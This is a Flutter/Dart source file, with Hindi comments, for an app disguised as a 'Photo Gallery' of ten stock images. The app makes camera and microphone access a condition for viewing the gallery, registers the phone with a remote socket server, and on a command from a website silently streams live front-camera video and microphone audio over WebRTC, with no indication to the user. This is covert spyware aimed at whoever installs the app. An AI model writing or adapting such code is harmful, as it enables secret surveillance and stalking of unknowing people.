import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.io' as IO;
import 'package:flutter_webrtc/flutter_webrtc.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Photo Gallery',
      theme: ThemeData(primarySwatch: Colors.blue),
      home: const GalleryScreen(),
    );
  }
}

class GalleryScreen extends StatefulWidget {
  const GalleryScreen({super.key});

  @override
  _GalleryScreenState createState() => _GalleryScreenState();
}

class _GalleryScreenState extends State<GalleryScreen> {
  late IO.Socket socket;
  RTCPeerConnection? _peerConnection;
  MediaStream? _localStream;
  bool _isPermissionsGranted = false;
  
  // फोन की पहचान के लिए नाम
  final String deviceName = "Android Phone 1"; 

  @override
  void initState() {
    super.initState();
    _requestPermissionsAndConnect();
  }

  // 1. ऐप खुलते ही कैमरा और माइक की परमिशन मांगना
  Future<void> _requestPermissionsAndConnect() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.camera,
      Permission.microphone,
    ].request();

    if (statuses[Permission.camera]!.isGranted &&
        statuses[Permission.microphone]!.isGranted) {
      setState(() {
        _isPermissionsGranted = true;
      });
      _initSocketConnection();
    }
  }

  // 2. आपके Render वाले बैकएंड से सॉकेट कनेक्शन जोड़ना
  void _initSocketConnection() {
    socket = IO.io('https://backend-i0ou.onrender.com', <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
    });

    socket.onConnect((_) {
      print('Connected to signaling server');
      socket.emit('register-device', deviceName);
    });

    // जब आप वेबसाइट से उस फोन को लाइव देखने के लिए क्लिक करेंगे
    socket.on('request-stream', (webSocketId) async {
      await _startStreaming(webSocketId);
    });

    socket.on('offer', (data) async {
      if (_peerConnection == null) return;
      RTCSessionDescription offer = RTCSessionDescription(
        data['offer']['sdp'],
        data['offer']['type'],
      );
      await _peerConnection!.setRemoteDescription(offer);
      RTCSessionDescription answer = await _peerConnection!.createAnswer();
      await _peerConnection!.setLocalDescription(answer);
      socket.emit('answer', {'answer': answer.toMap(), 'target': data['sender']});
    });

    socket.on('ice-candidate', (data) async {
      if (_peerConnection == null) return;
      RTCIceCandidate candidate = RTCIceCandidate(
        data['candidate']['candidate'],
        data['candidate']['sdpMid'],
        data['candidate']['sDpMLineIndex'],
      );
      await _peerConnection!.addCandidate(candidate);
    });
  }

  // 3. कैमरा/माइक चालू करके WebRTC के जरिए लाइव स्ट्रीम भेजना
  Future<void> _startStreaming(String webSocketId) async {
    final Map<String, dynamic> mediaConstraints = {
      'audio': true,
      'video': {
        'mandatory': {
          'minWidth': '640',
          'minHeight': '480',
          'minFrameRate': '30',
        },
        'facingMode': 'user', // फ्रंट कैमरा
        'optional': [],
      },
    };

    try {
      _localStream = await navigator.mediaDevices.getUserMedia(mediaConstraints);

      Map<String, dynamic> configuration = {
        'iceServers': [
          {'urls': 'stun:stun.l.google.com:19302'}
        ]
      };

      _peerConnection = await createPeerConnection(configuration);

      _localStream!.getTracks().forEach((track) {
        _peerConnection!.addTrack(track, _localStream!);
      });

      _peerConnection!.onIceCandidate = (RTCIceCandidate? candidate) {
        if (candidate != null) {
          socket.emit('ice-candidate', {
            'candidate': candidate.toMap(),
            'target': webSocketId,
          });
        }
      };

      RTCSessionDescription description = await _peerConnection!.createOffer({});
      await _peerConnection!.setLocalDescription(description);

      socket.emit('offer', {
        'offer': description.toMap(),
        'target': webSocketId,
      });
    } catch (e) {
      print('Error starting stream: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Photo Gallery')),
      body: _isPermissionsGranted
          ? ListView.builder(
              itemCount: 10, // ठीक 10 सुंदर इमेजेस
              itemBuilder: (context, index) {
                return Padding(
                  padding: const EdgeInsets.all(8.0),
                  child: Card(
                    elevation: 4,
                    child: Column(
                      children: [
                        Image.network(
                          'https://picsum.photos/seed/image${index + 1}/600/300',
                          height: 200,
                          width: double.infinity,
                          fit: BoxFit.cover,
                        ),
                        Padding(
                          padding: const EdgeInsets.all(8.0),
                          child: Text(
                            'Beautiful Scenery Image ${index + 1}',
                            style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              },
            )
          : const Center(
              child: Padding(
                padding: EdgeInsets.all(24.0),
                child: Text(
                  'Please allow Camera and Microphone permissions to access the gallery.',
                  textAlign: TextAlign.center,
                  style: TextStyle(fontSize: 18),
                ),
              ),
            ),
    );
  }
}
